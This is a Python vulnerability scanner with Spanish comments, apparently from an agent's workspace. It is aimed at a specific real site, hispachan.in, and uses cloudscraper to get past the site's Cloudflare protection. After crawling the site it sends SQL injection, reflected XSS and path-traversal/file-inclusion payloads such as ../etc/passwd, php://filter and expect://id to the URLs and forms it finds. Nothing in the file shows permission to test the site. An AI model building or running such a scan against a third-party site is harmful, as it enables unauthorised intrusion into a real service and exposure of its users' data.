#!/usr/bin/env python3
import cloudscraper
import requests
from bs4 import BeautifulSoup
import re
import json
from urllib.parse import urljoin, urlparse
import time

class HispachanAnalyzer:
    def __init__(self):
        self.base_url = "https://hispachan.in/"
        self.scraper = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'mobile': False
            }
        )
        self.discovered_urls = set()
        self.forms = []
        self.potential_vulns = []
        
    def crawl_site(self, max_pages=20):
        """Crawlear el sitio para descubrir URLs y estructuras"""
        print("[*] Iniciando crawling del sitio...")
        to_visit = [self.base_url]
        visited = set()
        
        while to_visit and len(visited) < max_pages:
            url = to_visit.pop(0)
            if url in visited:
                continue
                
            print(f"[*] Visitando: {url}")
            visited.add(url)
            
            try:
                response = self.scraper.get(url, timeout=10)
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Buscar más URLs
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        full_url = urljoin(url, href)
                        
                        # Solo URLs del mismo dominio
                        if urlparse(full_url).netloc == urlparse(self.base_url).netloc:
                            self.discovered_urls.add(full_url)
                            if full_url not in visited and full_url not in to_visit:
                                to_visit.append(full_url)
                    
                    # Buscar formularios
                    forms = soup.find_all('form')
                    for form in forms:
                        form_data = {
                            'url': url,
                            'action': form.get('action', ''),
                            'method': form.get('method', 'GET'),
                            'inputs': []
                        }
                        
                        for inp in form.find_all(['input', 'textarea', 'select']):
                            form_data['inputs'].append({
                                'name': inp.get('name', ''),
                                'type': inp.get('type', 'text'),
                                'value': inp.get('value', '')
                            })
                        
                        self.forms.append(form_data)
                        
            except Exception as e:
                print(f"[-] Error crawling {url}: {str(e)}")
        
        print(f"\n[+] URLs descubiertas: {len(self.discovered_urls)}")
        print(f"[+] Formularios encontrados: {len(self.forms)}")
        
    def test_sql_injection(self):
        """Probar inyección SQL básica"""
        print("\n[*] Probando inyección SQL...")
        
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "1' OR '1' = '1",
            "' UNION SELECT NULL--",
            "' AND 1=0 UNION SELECT NULL--"
        ]
        
        # Probar en URLs con parámetros
        for url in self.discovered_urls:
            if '?' in url:
                base, params = url.split('?', 1)
                for payload in sql_payloads:
                    test_url = f"{base}?{params}&test={payload}"
                    try:
                        response = self.scraper.get(test_url, timeout=5)
                        
                        # Buscar indicadores de error SQL
                        error_patterns = [
                            r'mysql_fetch',
                            r'Warning.*mysql',
                            r'SQL syntax',
                            r'MySQLSyntaxErrorException',
                            r'valid MySQL result',
                            r'PostgreSQL.*ERROR',
                            r'ORA-[0-9]{5}',
                            r'Microsoft.*ODBC.*SQL',
                            r'Microsoft.*OLE DB.*SQL',
                            r'Incorrect syntax near',
                            r'SQLServer JDBC Driver',
                            r'SqlException',
                            r'Syntax error in query expression'
                        ]
                        
                        for pattern in error_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                self.potential_vulns.append({
                                    'type': 'SQL Injection',
                                    'url': test_url,
                                    'pattern': pattern
                                })
                                print(f"[!] Posible SQLi en: {test_url}")
                                break
                                
                    except Exception as e:
                        pass
        
        # Probar en formularios
        for form in self.forms:
            if form['method'].upper() == 'POST':
                action_url = urljoin(form['url'], form['action'])
                
                for inp in form['inputs']:
                    if inp['name']:
                        for payload in sql_payloads[:3]:  # Solo algunos payloads
                            data = {inp['name']: payload}
                            
                            try:
                                response = self.scraper.post(action_url, data=data, timeout=5)
                                
                                for pattern in error_patterns:
                                    if re.search(pattern, response.text, re.IGNORECASE):
                                        self.potential_vulns.append({
                                            'type': 'SQL Injection (POST)',
                                            'url': action_url,
                                            'field': inp['name'],
                                            'pattern': pattern
                                        })
                                        print(f"[!] Posible SQLi POST en: {action_url} - Campo: {inp['name']}")
                                        break
                                        
                            except Exception as e:
                                pass
    
    def test_xss(self):
        """Probar XSS básico"""
        print("\n[*] Probando XSS...")
        
        xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            "';alert(1);//",
            '<iframe src="javascript:alert(1)">',
            '<body onload=alert(1)>'
        ]
        
        for url in list(self.discovered_urls)[:10]:  # Limitar para no ser muy agresivo
            if '?' in url:
                base, params = url.split('?', 1)
                
                for payload in xss_payloads[:3]:
                    test_url = f"{base}?{params}&xss={payload}"
                    
                    try:
                        response = self.scraper.get(test_url, timeout=5)
                        
                        # Verificar si el payload se refleja sin sanitizar
                        if payload in response.text:
                            self.potential_vulns.append({
                                'type': 'XSS Reflected',
                                'url': test_url,
                                'payload': payload
                            })
                            print(f"[!] Posible XSS en: {test_url}")
                            
                    except Exception as e:
                        pass
    
    def test_file_inclusion(self):
        """Probar inclusión de archivos"""
        print("\n[*] Probando inclusión de archivos...")
        
        lfi_payloads = [
            '../../../etc/passwd',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
            'php://filter/convert.base64-encode/resource=index',
            'file:///etc/passwd',
            'expect://id'
        ]
        
        for url in self.discovered_urls:
            if '?' in url:
                base, params = url.split('?', 1)
                
                # Buscar parámetros que puedan ser vulnerables
                param_names = re.findall(r'([^&=]+)=', params)
                
                for param in param_names:
                    for payload in lfi_payloads:
                        test_url = f"{base}?{param}={payload}"
                        
                        try:
                            response = self.scraper.get(test_url, timeout=5)
                            
                            # Buscar indicadores de LFI exitoso
                            if any(indicator in response.text for indicator in ['root:', 'nobody:', '/bin/bash', 'uid=']):
                                self.potential_vulns.append({
                                    'type': 'Local File Inclusion',
                                    'url': test_url,
                                    'param': param
                                })
                                print(f"[!] Posible LFI en: {test_url}")
                                
                        except Exception as e:
                            pass
    
    def analyze_headers(self):
        """Analizar headers de seguridad"""
        print("\n[*] Analizando headers de seguridad...")
        
        try:
            response = self.scraper.get(self.base_url)
            headers = response.headers
            
            security_headers = {
                'X-Frame-Options': 'Previene clickjacking',
                'X-Content-Type-Options': 'Previene MIME sniffing',
                'Content-Security-Policy': 'Política de seguridad de contenido',
                'Strict-Transport-Security': 'Fuerza HTTPS',
                'X-XSS-Protection': 'Protección XSS del navegador'
            }
            
            print("\n[+] Headers de seguridad:")
            for header, description in security_headers.items():
                if header in headers:
                    print(f"    ✓ {header}: {headers[header]}")
                else:
                    print(f"    ✗ {header}: NO PRESENTE - {description}")
                    self.potential_vulns.append({
                        'type': 'Missing Security Header',
                        'header': header,
                        'description': description
                    })
                    
        except Exception as e:
            print(f"[-] Error analizando headers: {str(e)}")
    
    def save_results(self):
        """Guardar resultados del análisis"""
        results = {
            'discovered_urls': list(self.discovered_urls),
            'forms': self.forms,
            'potential_vulnerabilities': self.potential_vulns,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        
        with open('/workspace/hispachan_analysis.json', 'w') as f:
            json.dump(results, f, indent=2)
            
        print(f"\n[+] Resultados guardados en: /workspace/hispachan_analysis.json")
        print(f"[+] Total de vulnerabilidades potenciales: {len(self.potential_vulns)}")
        
        if self.potential_vulns:
            print("\n[!] Resumen de vulnerabilidades encontradas:")
            vuln_types = {}
            for vuln in self.potential_vulns:
                vuln_type = vuln['type']
                vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
            
            for vuln_type, count in vuln_types.items():
                print(f"    - {vuln_type}: {count}")
    
    def run_full_analysis(self):
        """Ejecutar análisis completo"""
        print("[*] Iniciando análisis completo de Hispachan...")
        
        self.crawl_site()
        self.analyze_headers()
        self.test_sql_injection()
        self.test_xss()
        self.test_file_inclusion()
        self.save_results()
        
        print("\n[+] Análisis completo finalizado!")

if __name__ == "__main__":
    analyzer = HispachanAnalyzer()
    analyzer.run_full_analysis()